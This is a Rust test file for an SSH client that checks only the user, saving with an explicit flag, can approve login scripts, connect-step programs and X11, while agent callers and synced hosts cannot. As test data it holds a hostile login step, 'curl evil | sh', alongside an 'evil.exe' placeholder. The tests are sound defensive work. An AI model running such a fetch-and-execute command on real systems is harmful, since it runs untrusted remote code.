//! Who may approve a login script: only the user, saving exactly these steps.

use serde_json::json;
use sshcraft_model::login_script::{LoginStep, approval_argv};
use sshcraft_model::model::{ConnectionSettings, Host, HostId};

use crate::{Caller, Session, SessionConfig};

fn host(steps: Vec<LoginStep>) -> Host {
    Host {
        id: HostId::new(),
        name: "jump".into(),
        group_id: None,
        settings: ConnectionSettings { address: Some("jump.example.org".into()), login_script: Some(steps), ..Default::default() },
        location: None,
        tags: Vec::new(),
        os: None,
        forwards: Vec::new(),
    }
}

fn approved(session: &Session, steps: &[LoginStep]) -> bool {
    session.store().command_approved(&sshcraft_store::store::command_digest(&approval_argv(steps))).unwrap()
}

#[tokio::test]
async fn the_user_approves_a_script_by_saving_it() {
    let dir = tempfile::tempdir().unwrap();
    let (session, _) = Session::open(SessionConfig::for_tests(dir.path())).unwrap();
    let steps = vec![LoginStep { expect: "Choice:".into(), send: "2".into() }];
    session.execute(Caller::User, "host.save", json!({ "host": host(steps.clone()), "approve_login_script": true })).await.unwrap();
    assert!(approved(&session, &steps));
    let other = vec![LoginStep { expect: "Choice:".into(), send: "3".into() }];
    assert!(!approved(&session, &other), "only the exact steps");
}

#[tokio::test]
async fn saving_without_the_flag_or_as_an_agent_approves_nothing() {
    let dir = tempfile::tempdir().unwrap();
    let (session, _) = Session::open(SessionConfig::for_tests(dir.path())).unwrap();
    let steps = vec![LoginStep { expect: "$ ".into(), send: "curl evil | sh".into() }];
    session.execute(Caller::User, "host.save", json!({ "host": host(steps.clone()) })).await.unwrap();
    assert!(!approved(&session, &steps));
    let agent =
        Caller::Agent { name: crate::caller::AgentName::new("claude-code").unwrap(), via: crate::caller::Via::Mcp, conn: crate::caller::ConnId(1) };
    let _ = session.execute(agent, "host.save", json!({ "host": host(steps.clone()), "approve_login_script": true })).await;
    assert!(!approved(&session, &steps));
}

#[tokio::test]
async fn a_script_past_its_limits_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let (session, _) = Session::open(SessionConfig::for_tests(dir.path())).unwrap();
    let steps = vec![LoginStep { expect: String::new(), send: "x".into() }];
    assert!(session.execute(Caller::User, "host.save", json!({ "host": host(steps) })).await.is_err());
}

mod step_programs {
    use super::*;
    use sshcraft_model::hooks::{ConnectStep, approval_argv as step_argv};

    fn program(argv: &[&str]) -> Vec<String> {
        argv.iter().map(|a| (*a).to_string()).collect()
    }

    fn step_approved(session: &Session, argv: &[String]) -> bool {
        session.store().command_approved(&sshcraft_store::store::command_digest(&step_argv(argv))).unwrap()
    }

    #[tokio::test]
    async fn only_the_programs_the_user_entered_are_allowed() {
        let dir = tempfile::tempdir().unwrap();
        let (session, _) = Session::open(SessionConfig::for_tests(dir.path())).unwrap();
        let foreign = program(&["evil.exe"]);
        let mine = program(&["wg-quick", "up", "office"]);
        let mut h = host(Vec::new());
        h.settings.login_script = None;
        // As sync or a share would bring it: a program nobody allowed here.
        h.settings.after_disconnect = Some(vec![ConnectStep::Command { argv: foreign.clone(), wait_secs: 0 }]);
        session.store().upsert_host(&h).unwrap();
        // The user changes the proxy and adds a program of their own.
        h.settings.proxy = Some(sshcraft_model::model::Proxy::Command { argv: program(&["nc", "%h", "%p"]) });
        h.settings.before_connect = Some(vec![ConnectStep::Command { argv: mine.clone(), wait_secs: 0 }]);
        let params = json!({ "host": h, "approve_command": true, "approve_programs": [mine, program(&["not-in-the-host"])] });
        session.execute(Caller::User, "host.save", params).await.unwrap();
        assert!(step_approved(&session, &mine), "the program the user entered");
        assert!(!step_approved(&session, &foreign), "never the program that came from elsewhere");
        assert!(!step_approved(&session, &program(&["not-in-the-host"])), "never one the host does not run");
        assert!(session.store().command_approved(&sshcraft_store::store::command_digest(&program(&["nc", "%h", "%p"]))).unwrap(), "the proxy");
    }
}

mod x11 {
    use super::*;
    use sshcraft_model::model::{Group, GroupId};

    #[tokio::test]
    async fn x11_from_elsewhere_stays_off_until_the_user_allows_it() {
        let dir = tempfile::tempdir().unwrap();
        let (session, _) = Session::open(SessionConfig::for_tests(dir.path())).unwrap();
        let mut h = host(Vec::new());
        h.settings.login_script = None;
        h.settings.x11 = Some(true);
        // As sync or a share brings it.
        session.store().upsert_host(&h).unwrap();
        assert!(!crate::sessions::x11_allowed(&session.store(), h.id));
        // Saved without the flag, or by an agent: still off.
        session.execute(Caller::User, "host.save", json!({ "host": h })).await.unwrap();
        assert!(!crate::sessions::x11_allowed(&session.store(), h.id));
        session.execute(Caller::User, "host.save", json!({ "host": h, "approve_x11": true })).await.unwrap();
        assert!(crate::sessions::x11_allowed(&session.store(), h.id));
    }

    #[tokio::test]
    async fn x11_of_a_group_is_allowed_for_the_group() {
        let dir = tempfile::tempdir().unwrap();
        let (session, _) = Session::open(SessionConfig::for_tests(dir.path())).unwrap();
        let mut g = Group { id: GroupId::new(), name: "lab".into(), parent_id: None, defaults: Default::default(), location: None, tags: Vec::new() };
        g.defaults.x11 = Some(true);
        session.store().upsert_group(&g).unwrap();
        let mut h = host(Vec::new());
        h.settings.login_script = None;
        h.group_id = Some(g.id);
        session.store().upsert_host(&h).unwrap();
        assert!(!crate::sessions::x11_allowed(&session.store(), h.id));
        session.execute(Caller::User, "group.save", json!({ "group": g, "approve_x11": true })).await.unwrap();
        assert!(crate::sessions::x11_allowed(&session.store(), h.id));
        // A host that switches it off itself stays off.
        h.settings.x11 = Some(false);
        session.store().upsert_host(&h).unwrap();
        assert!(!crate::sessions::x11_allowed(&session.store(), h.id));
    }
}
